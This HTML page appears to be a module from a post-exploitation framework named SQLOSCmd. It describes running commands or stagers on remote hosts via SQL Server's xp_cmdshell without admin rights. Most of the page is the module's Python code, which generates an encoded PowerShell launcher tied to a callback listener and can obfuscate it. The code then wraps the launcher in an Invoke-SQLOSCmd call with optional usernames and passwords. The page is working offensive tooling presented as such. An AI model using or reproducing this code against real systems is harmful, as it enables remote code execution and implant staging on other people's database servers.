<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>SQLOSCmd</title>
</head><body>Executes a command or stager on remote hosts using xp_cmdshell<br/>
Does not need Admin<br/>
<br/>
moduleCode = &quot;&quot;<br/>
    if obfuscate:<br/>
      helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)<br/>
      moduleSource = moduleSource.replace(&quot;module_source&quot;, &quot;obfuscated_module_source&quot;)<br/>
    try:<br/>
      with open(moduleSource, 'r') as source:<br/>
        moduleCode = source.read()<br/>
    except:<br/>
      print helpers.color(&quot;[!] Could not read module source path at: &quot; + str(moduleSource))<br/>
      return &quot;&quot;<br/>
    script = moduleCode<br/>
<br/>
<br/>
    if command == &quot;&quot;:<br/>
      if not self.mainMenu.listeners.is_listener_valid(listenerName):<br/>
        print helpers.color(&quot;[!] Invalid listener: &quot; + listenerName)<br/>
        return &quot;&quot;<br/>
      else:<br/>
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)<br/>
        if launcher == &quot;&quot;:<br/>
          return &quot;&quot;<br/>
        else:<br/>
          command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher<br/>
<br/>
<br/>
    scriptEnd = &quot;Invoke-SQLOSCmd -Instance \&quot;%s\&quot; -Command \&quot;%s\&quot;&quot; % (instance, command) <br/>
<br/>
    if username != &quot;&quot;:<br/>
      scriptEnd += &quot; -UserName &quot;+username<br/>
    if password != &quot;&quot;:<br/>
      scriptEnd += &quot; -Password &quot;+password<br/>
    if obfuscate:<br/>
scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)</body></html>